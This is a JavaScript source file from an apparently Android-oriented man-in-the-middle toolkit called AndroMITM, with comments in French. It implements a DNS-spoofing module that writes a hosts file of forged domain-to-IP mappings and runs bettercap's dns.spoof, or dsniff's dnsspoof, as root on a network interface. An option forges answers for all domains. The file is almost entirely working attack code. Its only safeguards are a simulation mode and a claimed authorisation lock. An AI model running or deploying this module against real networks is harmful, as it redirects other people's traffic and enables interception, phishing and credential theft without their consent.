/**
 * AndroMITM — modules/dnsspoof.js
 * Spoofing DNS : bettercap dns.spoof ou dnsspoof (dsniff) avec fichier hosts.
 * ⚠ MODULE D'ATTAQUE — verrouillé sans autorisation + root requis.
 */
'use strict';

const { ModuleBase } = require('./base');
const fs = require('fs');
const path = require('path');
const { DATA_DIR } = require('../lib/store');

class DnsSpoofModule extends ModuleBase {
  constructor() {
    super('dns', {
      requires: [
        { tool: 'bettercap', reason: 'dns.spoof intégré (recommandé)' },
        { tool: 'dnsspoof', reason: 'repli dsniff (optionnel)' },
      ],
      needsRoot: true,
      attackModule: true,
    });
    this.backend = null;
    this.hostsFile = null;
  }

  runtimeInfo() { return { backend: this.backend, entries: this.entries || [], hostsFile: this.hostsFile }; }
  safeCfg(cfg) { return { iface: cfg.iface, entries: cfg.entries, allDomains: !!cfg.allDomains }; }

  onStart(cfg) {
    const { SIM, whichTool, privileged } = this.ctx;
    this.iface = cfg.iface || 'wlan0';
    this.entries = (cfg.entries || []).map((e) => ({ domain: String(e.domain || '').trim(), ip: String(e.ip || '').trim() }))
      .filter((e) => e.domain && e.ip);
    if (!this.entries.length) throw new Error('aucune entrée DNS (cfg.entries = [{domain:"exemple.test", ip:"192.168.1.66"}])');

    // fichier hosts dédié pour dnsspoof
    this.hostsFile = path.join(DATA_DIR, `dns-hosts-${Date.now()}.txt`);
    fs.mkdirSync(path.dirname(this.hostsFile), { recursive: true });
    fs.writeFileSync(this.hostsFile, this.entries.map((e) => `${e.ip}\t${e.domain}`).join('\n') + '\n');

    if (SIM) {
      this.backend = 'simulation';
      this.simTimer = setInterval(() => {
        const e = this.entries[Math.floor(Math.random() * this.entries.length)];
        this.emit('info', 'dns.response', { domain: e.domain, resolved: e.ip, sim: true });
      }, 2500);
      return;
    }

    if (whichTool('bettercap')) {
      this.backend = 'bettercap';
      const evalStr = [
        'set dns.spoof true',
        `set dns.spoof.hosts ${this.hostsFile}`,
        ...(cfg.allDomains ? ['set dns.spoof.all true'] : []),
        'dns.spoof on',
      ].join('; ');
      const { cmd, args } = privileged('bettercap', ['-iface', this.iface, '-eval', evalStr]);
      this.ctx.startProcess('dns', cmd, args, {
        onLine: (line) => this.emit('info', 'dns.raw', { line }),
        onExit: (code) => { if (this.state === 'running') this.emit('warn', 'dns.exited', { code }); },
      });
    } else if (whichTool('dnsspoof')) {
      this.backend = 'dnsspoof';
      const { cmd, args } = privileged('dnsspoof', ['-i', this.iface, '-f', this.hostsFile]);
      this.ctx.startProcess('dns', cmd, args, {
        onLine: (line) => this.emit('info', 'dns.raw', { line }),
        onExit: (code) => { if (this.state === 'running') this.emit('warn', 'dns.exited', { code }); },
      });
    } else {
      throw new Error('ni bettercap ni dnsspoof disponibles — installer via scripts/install-termux.sh');
    }
  }

  onStop() {
    const { SIM, whichTool, privileged } = this.ctx;
    if (this.simTimer) { clearInterval(this.simTimer); this.simTimer = null; }
    this.ctx.stopProcess('dns');
    if (!SIM && whichTool('bettercap')) {
      try {
        const { cmd, args } = privileged('bettercap', ['-iface', this.iface, '-eval', 'dns.spoof off']);
        require('child_process').execFile(cmd, args, { timeout: 5000 }, () => {});
      } catch (_) { /* ignore */ }
    }
    try { if (this.hostsFile && fs.existsSync(this.hostsFile)) fs.unlinkSync(this.hostsFile); } catch (_) { /* ignore */ }
  }
}

module.exports = { DnsSpoofModule };
